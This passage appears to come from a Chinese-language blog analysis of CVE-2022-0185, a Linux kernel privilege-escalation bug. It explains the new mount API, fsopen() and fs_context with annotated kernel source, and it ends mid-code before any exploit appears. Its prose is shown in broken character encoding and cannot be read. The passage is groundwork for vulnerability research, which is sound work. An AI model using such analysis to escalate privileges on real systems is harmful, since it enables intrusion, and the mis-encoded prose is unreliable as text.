<code>CAP_SYS_ADMIN</code> æƒé™ï¼ˆæˆ–æ˜¯å¼€å¯äº† unprivileged namespaceï¼‰çš„æ”»å‡»è€…è€Œè¨€å…¶å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œæˆæœ¬åœ°ææƒï¼Œè¯¥æ¼æ´è·å¾—äº†é«˜è¾¾ <code>8.4</code> çš„ CVSS è¯„åˆ†</p><blockquote><p>å‘ç°æ¼æ´çš„å®‰å…¨ç ”ç©¶å‘˜çš„æŒ–æ˜ä¸åˆ©ç”¨è¿‡ç¨‹å‚è§<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">è¿™é‡Œ</a>ï¼Œæœ¬æ–‡ç¼–å†™æ—¶ä¹Ÿæœ‰ä¸€å®šå‚è€ƒ</p></blockquote><p>æœ¬æ–‡é€‰æ‹©å†…æ ¸ç‰ˆæœ¬ <code>5.4</code> è¿›è¡Œåˆ†æï¼Œåœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›åŸºç¡€çŸ¥è¯†</p><h2 id="Filesystem-mount-API-åˆæ¢"><a href="#Filesystem-mount-API-åˆæ¢" class="headerlink" title="Filesystem mount API åˆæ¢"></a>Filesystem mount API åˆæ¢</h2><blockquote><p>å‚è§<a href="https://zhuanlan.zhihu.com/p/93592262">çŸ¥ä¹ä¸Šçš„è¯¥ç³»åˆ—æ–‡ç« </a></p></blockquote><p>ç›¸ä¿¡å¤§å®¶å¯¹äº Linux ä¸‹çš„æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½éƒ½æ˜¯éå¸¸ç†Ÿæ‚‰â€”â€” <code>mount</code>  ç³»ç»Ÿè°ƒç”¨è¢«ç”¨ä»¥å°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ä»¥ <code>/</code> ä¸ºæ ¹èŠ‚ç‚¹çš„æ–‡ä»¶æ ‘ä¸Šï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æŒ‚è½½ç¡¬ç›˜ <code>/dev/sdb1</code> åˆ° <code>/mnt/temp</code> ç›®å½•ä¸‹ï¼Œä¹‹åå°±èƒ½åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œæ–‡ä»¶è®¿é—®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/temp</span><br></code></pre></td></tr></table></figure><p>æˆ–æ˜¯é€šè¿‡ç¼–å†™ç¨‹åºçš„æ–¹å¼ä½¿ç”¨è£¸çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨è¿›è¡ŒæŒ‚è½½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mount(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯<a href="https://lwn.net/Articles/753473/">æ€»æœ‰äº›äººæƒ³æä¸ªå¤§æ–°é—»</a>ï¼Œä»¥ AL Viro ä¸ºé¦–çš„å¼€å‘è€…è®¤ä¸ºæ—§çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨å­˜åœ¨è¯¸å¤šæ¼æ´ä¸è®¾è®¡ç¼ºé™·ï¼Œäºæ˜¯å†³å®šé‡å†™ä¸€å¥—æ–°çš„ mount APIï¼Œå¹¶<a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">æˆåŠŸè¢«åˆå¹¶åˆ°å†…æ ¸ä¸»çº¿</a>ï¼Œç§°ä¹‹ä¸º <a href="https://docs.kernel.org/filesystems/mount_api.html">Filesystem Mount API</a></p><p>æ–°çš„ mount API å°†è¿‡å»çš„ä¸€ä¸ªç®€å•çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½æ‹†åˆ†æˆäº†æ•°ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯¹åº”ä¸åŒçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½é˜¶æ®µï¼Œäºæ˜¯ä¹ç°åœ¨ Linux ä¸Šæœ‰ç€ä¸¤å¥—å¹¶è¡Œçš„ mount API</p><blockquote><p><del>ğŸ‘´çš„è¯„ä»·æ˜¯é—²ç€æ²¡äº‹å¹²å¯ä»¥å»æŠŠæ‘å£å¤§ç²ªæŒ‘ä¸€ä¸‹</del></p></blockquote><h3 id="Step-I-fsopen-è·å–ä¸€ä¸ª-filesystem-context"><a href="#Step-I-fsopen-è·å–ä¸€ä¸ª-filesystem-context" class="headerlink" title="Step.I - fsopen: è·å–ä¸€ä¸ª filesystem context"></a>Step.I - fsopen: è·å–ä¸€ä¸ª filesystem context</h3><p>è¿˜è®°å¾—ç¬”è€…ä»¥å‰è¯´è¿‡çš„ <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%80%E3%80%81%E2%80%9C%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6%E2%80%9D">Linux ä¸­ä¸€åˆ‡çš†æ–‡ä»¶</a> çš„å“²å­¦å—ï¼Œåœ¨æ–°çš„ mount API ä¸­ä¹Ÿéµå¾ªäº†è¿™æ ·çš„å“²å­¦â€”â€”å¦‚æœè¯´ <code>open()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶æä¾›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œé‚£ä¹ˆ <strong><code>fsopen()</code> ç³»ç»Ÿè°ƒç”¨ä¾¿ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶æä¾›ä¸€ä¸ªâ€æ–‡ä»¶ç³»ç»Ÿæè¿°ç¬¦â€œ</strong>â€”â€”ç§°ä¹‹ä¸º **<code>æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</code>**ï¼ˆfilesystem contextï¼‰</p><p><img src="https://i.loli.net/2021/02/25/iUoHNsaK5vOG9cR.png" alt="wait, it&#39;s all FILES"></p><p>ç”±äºæ ‡å‡†åº“ä¸­è¿˜æœªæ·»åŠ  new mount API ç›¸å…³çš„ä»£ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†™ raw syscall æ¥è¿›è¡Œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ‰“å¼€ä¸€ä¸ªç©ºç™½çš„ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼ˆéœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œæˆ–æ˜¯å¼€å¯äº† unprivileged namespace çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>unshare()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¸¦æœ‰è¯¥æƒé™çš„ namespaceï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ª<strong>ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</strong>ï¼Œå¹¶æ²¡æœ‰ä¸ä»»ä½•å®é™…è®¾å¤‡æˆ–æ–‡ä»¶è¿›è¡Œå…³è”â€”â€”è¿™æ˜¯æˆ‘ä»¬éœ€è¦åœ¨æ¥ä¸‹æ¥çš„æ­¥éª¤ä¸­å®Œæˆçš„é…ç½®</p><h4 id="âœ³-fsopen-in-kernel"><a href="#âœ³-fsopen-in-kernel" class="headerlink" title="âœ³ fsopen() in kernel"></a><strong>âœ³</strong> fsopen() in kernel</h4><blockquote><p>superblockã€dentry è¿™ç±»çš„ VFS åŸºç¡€çŸ¥è¯†ä¸åœ¨æ­¤å¤„ç§‘æ™®ï¼Œè¯·è‡ªè¡Œäº†è§£ï¼šï¼‰</p></blockquote><p>åœ¨å†…æ ¸å½“ä¸­ï¼Œ<code>fsopen()</code> ç³»ç»Ÿè°ƒç”¨çš„è¡Œä¸ºå®é™…ä¸Šå¯¹åº”åˆ›å»ºçš„æ˜¯ä¸€ä¸ª <code>fs_context</code> ç»“æ„ä½“ä½œä¸º filesystem contextï¼Œåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ file ç»“æ„ä½“å¹¶åˆ†é…ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŒ‰åç§°æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿä»¥ä¾¿äºå¯¹å…¶è¿›è¡Œè®¾ç½®ä»¥æŒ‚è½½</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬è¢«å…è®¸æŒ‡å®šåœ¨å“ªä¸ªå®¹å™¨ä¸­æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿï¼Œç”±æ­¤æŒ‡ç¤ºè¦ä½¿ç”¨å“ªä¸€ä¸ªå‘½åç©ºé—´</span><br><span class="hljs-comment"> * (å°¤å…¶æ˜¯å°†å“ªä¸ªç½‘ç»œå‘½åç©ºé—´ç”¨äºç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">// capabilities æœºåˆ¶ï¼Œæ£€æŸ¥å¯¹åº”ã€å‘½åç©ºé—´ã€‘æ˜¯å¦æœ‰ CAP_SYS_ADMIN æƒé™</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">// æ‹·è´ç”¨æˆ·ä¼ å…¥çš„æ–‡ä»¶ç³»ç»Ÿå</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><br><span class="hljs-comment">// æŒ‰åç§°è·å–æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ç»“æ„ä½“</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br><span class="hljs-comment">// åˆ†é… Logging buffer</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-comment">// åˆ›å»º file ç»“æ„ä½“å¹¶åˆ†é…æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>fs_context</code> çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”¨ä»¥ä¿å­˜åœ¨åˆ›å»ºä¸é‡æ–°é…ç½®ä¸€ä¸ª superblock ä¸­çš„å‚æ•°çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock çš„åˆ›å»ºä¼šå¡«å……åˆ° -&gt;root ä¸­ï¼Œé‡æ–°é…ç½®éœ€è¦è¯¥å­—æ®µå·²ç»è®¾ç½®.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å‚è§ Documentation/filesystems/mount_api.txt</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* ç”¨æˆ·ç©ºé—´è®¿é—®çš„äº’æ–¥é” */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* æ–‡ä»¶ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡ */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* root ä¸ superblock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* å°†è¦æŒ‚è½½çš„ç”¨æˆ·å‘½åç©ºé—´ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* å°†è¦æŒ‚è½½çš„ç½‘ç»œ1å‘½åç©ºé—´ */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* æŒ‚è½½è€…çš„ credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>*<span class="hljs-title">log</span>;</span><span class="hljs-comment">/* Logging buffer */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* æº (eg. è®¾å¤‡è·¯å¾„) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M è®¾ç½® */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* éœ€è¦è°ƒç”¨ ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>fs_context</code> çš„åˆå§‹åŒ–åœ¨ <code>alloc_fs_context()</code> ä¸­å®Œæˆï¼Œåœ¨ <code>fsopen()</code> ä¸­å¯¹åº”çš„æ˜¯ <code>FS_CONTEXT_FOR_MOUNT</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡.</span><br><span class="hljs-comment"> * @fs_type: æ–‡ä»¶ç³»ç»Ÿç±»å‹.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)//æƒ³ä¸å‡ºå’‹ç¿»</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock æ ‡å¿—ä½ (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: @sb_flags ä¸­å¯ç”¨çš„æˆå‘˜</span><br><span class="hljs-comment"> * @purpose: æœ¬æ¬¡é…ç½®çš„ç›®çš„.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿå¹¶åˆ›å»ºä¸€ä¸ªæŒ‚è½½ä¸Šä¸‹æ–‡ï¼ˆmount contextï¼‰ï¼ŒæŒ‚è½½ä¸Šä¸‹æ–‡è¢«ä»¥å¯¹åº”çš„æ ‡å¿—ä½è¿›è¡Œåˆå§‹åŒ–ï¼Œ</span><br><span class="hljs-comment"> * è‹¥ä»å¦ä¸€ä¸ª superblock ï¼ˆå¼•è‡ª @referenceï¼‰è¿›è¡Œ submount/automountï¼Œ</span><br><span class="hljs-comment"> * åˆ™å¯èƒ½ç”±ä»è¯¥ superblock æ‹·è´æ¥çš„å‚æ•°1ï¼ˆå¦‚å‘½åç©ºé—´ï¼‰.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br><span class="hljs-comment">// åˆ†é… fs_context ç»“æ„ä½“</span><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br><span class="hljs-comment">// è®¾ç½®å¯¹åº”å±æ€§</span><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-comment">// ç”± purpose è®¾ç½®å¯¹åº”çš„å‘½åç©ºé—´</span><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> è®©æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿæ— æ¡ä»¶æ”¯æŒè¿™å— */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span 